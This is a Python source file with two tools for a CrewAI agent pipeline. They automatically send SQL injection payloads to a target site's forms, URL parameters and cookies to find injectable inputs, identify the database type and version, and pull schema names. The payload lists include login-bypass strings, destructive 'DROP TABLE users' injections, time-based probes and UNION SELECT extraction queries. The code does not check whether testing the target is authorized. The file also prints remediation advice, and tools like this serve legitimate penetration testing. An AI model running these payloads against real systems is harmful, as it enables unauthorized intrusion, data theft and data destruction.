from crewai.tools import BaseTool
from typing import Type, List, Dict, Any
from pydantic import BaseModel, Field
import requests
from bs4 import BeautifulSoup
import re
import time
import logging
import random
import os
import yaml

class SQLInjectionScannerToolInput(BaseModel):
    """Input schema for SQLInjectionScannerTool."""
    target_url: str = Field(..., description="URL of the target website to scan.")
    entry_points: List[Dict[str, Any]] = Field(..., description="List of potential entry points identified by the reconnaissance agent.")

class SQLInjectionScannerTool(BaseTool):
    name: str = "SQL Injection Scanner"
    description: str = (
        "Scans a website for SQL injection vulnerabilities by testing various payloads against identified entry points."
    )
    args_schema: Type[BaseModel] = SQLInjectionScannerToolInput

    def _run(self, target_url: str, entry_points: List[Dict[str, Any]]) -> str:
        try:
            # Check if custom payloads file exists and load payloads from it
            custom_payloads = []
            custom_payloads_file = "custom_payloads.yaml"
            try:
                if os.path.exists(custom_payloads_file):
                    print(f"Found custom payloads file: {custom_payloads_file}")
                    with open(custom_payloads_file, 'r') as file:
                        yaml_content = yaml.safe_load(file)
                        if yaml_content and 'payloads' in yaml_content and yaml_content['payloads']:
                            custom_payloads = yaml_content['payloads']
                            print(f"Loaded {len(custom_payloads)} custom payloads for SQL vulnerability scanning")
                            if len(custom_payloads) > 0:
                                print(f"First custom payload: {custom_payloads[0]}")
                        else:
                            print("Custom payloads file exists but contains no payloads or has invalid format")
                else:
                    print(f"No custom payloads file found at: {custom_payloads_file}")
            except Exception as e:
                print(f"Error loading custom payloads: {str(e)}")
            
            # Basic SQL injection payloads for testing - use custom payloads if available
            if custom_payloads:
                print(f"Using {len(custom_payloads)} custom payloads for SQL injection testing")
                basic_payloads = custom_payloads
            else:
                # Default payloads if no custom ones are provided
                basic_payloads = [
                    "' OR '1'='1", 
                    "\" OR \"1\"=\"1",
                    "' OR 1=1 --",
                    "\" OR 1=1 --",
                    "' OR '1'='1' --",
                    "admin' --",
                    "1' OR '1' = '1",
                    "1\" OR \"1\" = \"1",
                    "' UNION SELECT 1,2,3 --",
                    "' UNION SELECT NULL,NULL,NULL --",
                    "1; DROP TABLE users --",
                    "1'; DROP TABLE users --",
                    "' OR 1=1 #",
                    "\" OR 1=1 #",
                    "' OR '1'='1' /*",
                    "' OR 1=1 LIMIT 1 --",
                    "') OR ('1'='1",
                    "\") OR (\"1\"=\"1"
                ]
                print("Using default SQL injection payloads")
            
            # Error-based payloads to help identify database type
            db_fingerprint_payloads = {
                "MySQL": [
                    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
                    "' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) --",
                    "' AND SLEEP(5) --",  # Time-based for MySQL
                ],
                "PostgreSQL": [
                    "' AND (SELECT 1 FROM PG_SLEEP(5)) --",  # Time-based for PostgreSQL
                    "' AND 1=(SELECT 1 FROM PG_DATABASE LIMIT 1) --",
                ],
                "SQLite": [
                    "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) --",  # Heavy query for SQLite
                    "' AND 1=1 AND datetime('now') --",
                ],
                "SQL Server": [
                    "' AND 1=(SELECT TOP 1 name FROM sysobjects) --",
                    "' WAITFOR DELAY '0:0:5' --",  # Time-based for SQL Server
                ],
                "Oracle": [
                    "' AND 1=(SELECT BANNER FROM SYS.V_$VERSION WHERE ROWNUM=1) --",
                    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('ASD',5) --"  # Time-based for Oracle
                ]
            }
            
            # Track vulnerabilities found
            vulnerabilities = []
            db_type_indicators = {}
            
            # Process each entry point
            for entry_point in entry_points:
                entry_type = entry_point.get('type', 'unknown')
                location = entry_point.get('location', '')
                parameter = entry_point.get('parameter', '')
                
                print(f"Testing entry point: {entry_type} at {location} with parameter {parameter}")
                result = self._test_entry_point(
                    target_url, entry_type, location, parameter, 
                    basic_payloads, db_fingerprint_payloads
                )
                
                if result['is_vulnerable']:
                    vulnerabilities.append({
                        'entry_type': entry_type,
                        'location': location,
                        'parameter': parameter,
                        'payload': result['successful_payload'],
                        'error_message': result.get('error_message', ''),
                        'response_time': result.get('response_time', 0)
                    })
                
                # Update database type indicators
                for db, count in result.get('db_indicators', {}).items():
                    if db in db_type_indicators:
                        db_type_indicators[db] += count
                    else:
                        db_type_indicators[db] = count
            
            # Determine the most likely database type
            most_likely_db = "Unknown"
            max_indicators = 0
            for db, count in db_type_indicators.items():
                if count > max_indicators:
                    max_indicators = count
                    most_likely_db = db
            
            # Format the results
            result_str = "SQL Injection Vulnerability Scan Results\n\n"
            
            if vulnerabilities:
                result_str += f"Found {len(vulnerabilities)} vulnerable entry points:\n\n"
                for i, vuln in enumerate(vulnerabilities, 1):
                    result_str += f"Vulnerability #{i}:\n"
                    result_str += f"  Entry Type: {vuln['entry_type']}\n"
                    result_str += f"  Location: {vuln['location']}\n"
                    result_str += f"  Parameter: {vuln['parameter']}\n"
                    result_str += f"  Successful Payload: {vuln['payload']}\n"
                    if vuln.get('error_message'):
                        result_str += f"  Error Message: {vuln['error_message']}\n"
                    result_str += f"  Response Time: {vuln.get('response_time', 0):.2f} seconds\n\n"
            else:
                result_str += "No SQL injection vulnerabilities were detected.\n\n"
            
            result_str += f"Most likely database type: {most_likely_db}\n"
            
            # Additional recommendations
            if vulnerabilities:
                result_str += "\nRecommendations:\n"
                result_str += "  - The identified entry points should be secured by implementing proper input validation\n"
                result_str += "  - Use prepared statements or parameterized queries to prevent SQL injection\n"
                result_str += "  - Consider implementing a Web Application Firewall (WAF) for additional protection\n"
            
            return result_str
            
        except Exception as e:
            return f"Error scanning for SQL injection vulnerabilities: {str(e)}"
    
    def _test_entry_point(self, target_url, entry_type, location, parameter, 
                        basic_payloads, db_fingerprint_payloads):
        result = {
            'is_vulnerable': False,
            'successful_payload': None,
            'db_indicators': {}
        }
        
        # First test with basic payloads
        for payload in basic_payloads:
            response_data = self._send_payload(target_url, entry_type, location, parameter, payload)
            
            if response_data.get('is_vulnerable', False):
                result['is_vulnerable'] = True
                result['successful_payload'] = payload
                result['error_message'] = response_data.get('error_message', '')
                result['response_time'] = response_data.get('response_time', 0)
                break
        
        # If vulnerable, try to determine the database type
        if result['is_vulnerable']:
            for db_type, payloads in db_fingerprint_payloads.items():
                indicators = 0
                for payload in payloads:
                    response_data = self._send_payload(target_url, entry_type, location, parameter, payload)
                    if response_data.get('db_indicator', False):
                        indicators += 1
                
                if indicators > 0:
                    result['db_indicators'][db_type] = indicators
        
        return result
    
    def _send_payload(self, target_url, entry_type, location, parameter, payload):
        result = {
            'is_vulnerable': False,
            'error_message': '',
            'response_time': 0,
            'db_indicator': False
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        try:
            start_time = time.time()
            
            if entry_type == 'form':
                # For form submissions
                form_data = {parameter: payload}
                response = requests.post(location, data=form_data, headers=headers, timeout=10)
            elif entry_type == 'url_parameter':
                # For URL parameters
                if '?' in location:
                    url = f"{location}&{parameter}={payload}"
                else:
                    url = f"{location}?{parameter}={payload}"
                response = requests.get(url, headers=headers, timeout=10)
            elif entry_type == 'cookie':
                # For cookie-based injections
                cookies = {parameter: payload}
                response = requests.get(location, cookies=cookies, headers=headers, timeout=10)
            else:
                # Default to GET request
                if '?' in location:
                    url = f"{location}&{parameter}={payload}"
                else:
                    url = f"{location}?{parameter}={payload}"
                response = requests.get(url, headers=headers, timeout=10)
            
            end_time = time.time()
            result['response_time'] = end_time - start_time
            
            # Check for common SQL error messages in the response
            error_patterns = [
                r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
                r"valid MySQL result", r"check the manual that corresponds to your MySQL server version",
                r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*oci_.*", r"Warning.*ora_.*",
                r"SQL Server.*Driver", r"OLE DB.*SQL Server", r"Warning.*mssql_.*", r"Warning.*sqlsrv_.*",
                r"Microsoft SQL Native Client error", r"ODBC SQL Server Driver", r"SQLServer JDBC Driver",
                r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException",
                r"Warning.*sqlite_.*", r"Warning.*PG::.*", r"PostgreSQL.*ERROR", r"Warning.*pg_.*"
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    result['is_vulnerable'] = True
                    result['error_message'] = re.search(pattern, response.text, re.IGNORECASE).group(0)
                    
                    # Determine database type from error
                    if "mysql" in result['error_message'].lower():
                        result['db_indicator'] = True
                        result['db_type'] = "MySQL"
                    elif "ora-" in result['error_message'].lower() or "oracle" in result['error_message'].lower():
                        result['db_indicator'] = True
                        result['db_type'] = "Oracle"
                    elif "sql server" in result['error_message'].lower() or "mssql" in result['error_message'].lower():
                        result['db_indicator'] = True
                        result['db_type'] = "SQL Server"
                    elif "sqlite" in result['error_message'].lower():
                        result['db_indicator'] = True
                        result['db_type'] = "SQLite"
                    elif "postgres" in result['error_message'].lower() or "pg::" in result['error_message'].lower():
                        result['db_indicator'] = True
                        result['db_type'] = "PostgreSQL"
                    
                    break
            
            # Check for timing-based vulnerabilities (if no error-based vulnerability found)
            if not result['is_vulnerable'] and result['response_time'] > 5.0:
                # If response took longer than 5 seconds, it might be vulnerable to time-based attacks
                result['is_vulnerable'] = True
                result['db_indicator'] = True
                
                # Try to determine which DB based on the payload that caused the delay
                if "SLEEP" in payload:
                    result['db_type'] = "MySQL"
                elif "PG_SLEEP" in payload:
                    result['db_type'] = "PostgreSQL"
                elif "WAITFOR" in payload:
                    result['db_type'] = "SQL Server"
                elif "DBMS_PIPE.RECEIVE_MESSAGE" in payload:
                    result['db_type'] = "Oracle"
            
            # Check for successful login bypass
            login_success_patterns = [
                r"Welcome.*admin", r"successfully logged in", r"authentication successful",
                r"logged in as", r"login successful", r"access granted"
            ]
            
            for pattern in login_success_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    result['is_vulnerable'] = True
                    result['auth_bypass'] = True
                    break
            
            # Check for data leakage (e.g., UNION SELECT payloads working)
            if "UNION SELECT" in payload.upper() and response.status_code == 200:
                if re.search(r"<td>\d+</td>\s*<td>\d+</td>", response.text):
                    result['is_vulnerable'] = True
                    result['data_leakage'] = True
            
        except requests.exceptions.Timeout:
            # If request times out, it might be due to a time-based SQL injection
            result['is_vulnerable'] = True
            result['timeout'] = True
            result['response_time'] = 10.0  # Timeout value
        except Exception as e:
            result['error'] = str(e)
        
        return result


class DatabaseIdentifierToolInput(BaseModel):
    """Input schema for DatabaseIdentifierTool."""
    target_url: str = Field(..., description="URL of the target website.")
    vulnerable_points: List[Dict[str, Any]] = Field(..., description="List of vulnerable entry points confirmed by the scanner.")

class DatabaseIdentifierTool(BaseTool):
    name: str = "Database Identifier"
    description: str = (
        "Identifies the specific database type and version being used by the target website."
    )
    args_schema: Type[BaseModel] = DatabaseIdentifierToolInput

    def _run(self, target_url: str, vulnerable_points: List[Dict[str, Any]]) -> str:
        try:
            if not vulnerable_points:
                return "No vulnerable points provided. Cannot identify database."
            
            # Database-specific version detection payloads
            db_version_payloads = {
                "MySQL": [
                    "' UNION SELECT @@version, NULL, NULL -- ",
                    "' UNION SELECT VERSION(), NULL, NULL -- ",
                    "' AND SUBSTRING(@@version,1,1)='5' -- ",
                ],
                "PostgreSQL": [
                    "' UNION SELECT version(), NULL, NULL -- ",
                    "' UNION SELECT current_setting('server_version'), NULL, NULL -- ",
                ],
                "SQLite": [
                    "' UNION SELECT sqlite_version(), NULL, NULL -- ",
                ],
                "SQL Server": [
                    "' UNION SELECT @@VERSION, NULL, NULL -- ",
                    "' UNION SELECT SERVERPROPERTY('ProductVersion'), NULL, NULL -- ",
                ],
                "Oracle": [
                    "' UNION SELECT banner FROM v$version WHERE ROWNUM=1 -- ",
                    "' UNION SELECT version FROM v$instance -- ",
                ]
            }
            
            # Database-specific schema detection payloads
            db_schema_payloads = {
                "MySQL": [
                    "' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 1 -- ",
                    "' UNION SELECT table_schema, NULL, NULL FROM information_schema.tables GROUP BY table_schema LIMIT 1 -- ",
                ],
                "PostgreSQL": [
                    "' UNION SELECT table_name, NULL, NULL FROM information_schema.tables LIMIT 1 -- ",
                    "' UNION SELECT table_schema, NULL, NULL FROM information_schema.tables GROUP BY table_schema LIMIT 1 -- ",
                ],
                "SQLite": [
                    "' UNION SELECT name, NULL, NULL FROM sqlite_master WHERE type='table' LIMIT 1 -- ",
                ],
                "SQL Server": [
                    "' UNION SELECT name, NULL, NULL FROM sysobjects WHERE xtype='U' LIMIT 1 -- ",
                    "' UNION SELECT DB_NAME(), NULL, NULL -- ",
                ],
                "Oracle": [
                    "' UNION SELECT table_name, NULL, NULL FROM all_tables WHERE ROWNUM=1 -- ",
                    "' UNION SELECT owner, NULL, NULL FROM all_tables WHERE ROWNUM=1 -- ",
                ]
            }
            
            db_results = {}
            version_results = {}
            schema_results = {}
            
            for vuln_point in vulnerable_points:
                entry_type = vuln_point.get('entry_type', 'unknown')
                location = vuln_point.get('location', '')
                parameter = vuln_point.get('parameter', '')
                
                # Test database type and version
                for db_type, payloads in db_version_payloads.items():
                    for payload in payloads:
                        response_data = self._send_identification_payload(
                            target_url, entry_type, location, parameter, payload
                        )
                        
                        if response_data.get('success', False):
                            db_results[db_type] = db_results.get(db_type, 0) + 1
                            if response_data.get('version_info'):
                                version_results[db_type] = response_data.get('version_info')
                
                # Test schema information
                for db_type, payloads in db_schema_payloads.items():
                    for payload in payloads:
                        response_data = self._send_identification_payload(
                            target_url, entry_type, location, parameter, payload
                        )
                        
                        if response_data.get('success', False) and response_data.get('schema_info'):
                            schema_results[db_type] = response_data.get('schema_info')
            
            # Determine the most likely database type
            most_likely_db = "Unknown"
            max_indicators = 0
            for db, count in db_results.items():
                if count > max_indicators:
                    max_indicators = count
                    most_likely_db = db
            
            # Format the results
            result_str = "Database Identification Results\n\n"
            
            if most_likely_db != "Unknown":
                result_str += f"Most likely database type: {most_likely_db}\n"
                
                if most_likely_db in version_results:
                    result_str += f"Version information: {version_results[most_likely_db]}\n"
                else:
                    result_str += "Version information: Could not determine specific version\n"
                
                if most_likely_db in schema_results:
                    result_str += f"Schema information: {schema_results[most_likely_db]}\n"
                else:
                    result_str += "Schema information: Could not extract schema details\n"
            else:
                result_str += "Could not determine database type with high confidence.\n"
                
                if db_results:
                    result_str += "Possible database types based on indicators:\n"
                    for db, count in db_results.items():
                        result_str += f"  - {db}: {count} indicators\n"
            
            # Add additional information about database security
            result_str += "\nDatabase Security Assessment:\n"
            if most_likely_db != "Unknown":
                # Add specific security recommendations based on the database type
                if most_likely_db == "MySQL":
                    result_str += "  - MySQL servers should have 'NO_BACKSLASH_ESCAPES' mode enabled\n"
                    result_str += "  - Use prepared statements with the mysqli or PDO extensions\n"
                    result_str += "  - Ensure proper privilege restrictions on database users\n"
                elif most_likely_db == "PostgreSQL":
                    result_str += "  - PostgreSQL has fewer SQL injection vectors but still needs proper parameterized queries\n"
                    result_str += "  - Use prepared statements with pg_prepare() and pg_execute()\n"
                    result_str += "  - Implement row-level security for sensitive tables\n"
                elif most_likely_db == "SQL Server":
                    result_str += "  - Disable xp_cmdshell and other extended stored procedures\n"
                    result_str += "  - Use parameterized queries with sqlsrv_prepare() or SqlCommand with parameters\n"
                    result_str += "  - Implement proper error handling to prevent error-based information leakage\n"
                elif most_likely_db == "Oracle":
                    result_str += "  - Use bind variables for all SQL statements\n"
                    result_str += "  - Implement proper privilege restrictions using the principle of least privilege\n"
                    result_str += "  - Consider using Oracle Virtual Private Database for row-level security\n"
                elif most_likely_db == "SQLite":
                    result_str += "  - Use parameterized statements with sqlite3_prepare() and bound parameters\n"
                    result_str += "  - Enable secure_delete pragma for sensitive applications\n"
                    result_str += "  - Consider encryption for the database file if it contains sensitive information\n"
            
            return result_str
            
        except Exception as e:
            return f"Error identifying database: {str(e)}"
    
    def _send_identification_payload(self, target_url, entry_type, location, parameter, payload):
        result = {
            'success': False,
            'version_info': None,
            'schema_info': None
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        try:
            if entry_type == 'form':
                # For form submissions
                form_data = {parameter: payload}
                response = requests.post(location, data=form_data, headers=headers, timeout=10)
            elif entry_type == 'url_parameter':
                # For URL parameters
                if '?' in location:
                    url = f"{location}&{parameter}={payload}"
                else:
                    url = f"{location}?{parameter}={payload}"
                response = requests.get(url, headers=headers, timeout=10)
            elif entry_type == 'cookie':
                # For cookie-based injections
                cookies = {parameter: payload}
                response = requests.get(location, cookies=cookies, headers=headers, timeout=10)
            else:
                # Default to GET request
                if '?' in location:
                    url = f"{location}&{parameter}={payload}"
                else:
                    url = f"{location}?{parameter}={payload}"
                response = requests.get(url, headers=headers, timeout=10)
            
            # Regular expressions to extract version information
            version_patterns = {
                # MySQL version patterns
                "MySQL": [
                    r"(\d+\.\d+\.\d+)([\w\d\-\.]+)?",
                    r"MySQL[\s/]*([\d\.]+)"
                ],
                # PostgreSQL version patterns
                "PostgreSQL": [
                    r"PostgreSQL ([\d\.]+)",
                    r"PG[SQL]* ([\d\.]+)"
                ],
                # SQL Server version patterns
                "SQL Server": [
                    r"Microsoft SQL Server ([\d\.]+)",
                    r"MSSQL[\d]+"
                ],
                # Oracle version patterns
                "Oracle": [
                    r"Oracle Database ([\d\.]+)",
                    r"Oracle ([\d\.]+)"
                ],
                # SQLite version patterns
                "SQLite": [
                    r"SQLite ([\d\.]+)",
                    r"sqlite([\d\.]+)"
                ]
            }
            
            # Check for version information in the response
            for db, patterns in version_patterns.items():
                for pattern in patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        result['success'] = True
                        result['version_info'] = match.group(1)
                        break
            
            # Check for schema information in the response
            schema_patterns = [
                r"<td>([\w_]+)</td>",  # Basic table/schema name in a table cell
                r"schema.*?name.*?['\"]([\w_]+)['\"]",  # Schema name in various formats
                r"table.*?name.*?['\"]([\w_]+)['\"]",   # Table name in various formats
                r"database.*?name.*?['\"]([\w_]+)['\"]" # Database name in various formats
            ]
            
            for pattern in schema_patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    result['success'] = True
                    result['schema_info'] = match.group(1)
                    break
            
        except Exception as e:
            result['error'] = str(e)
        
        return result 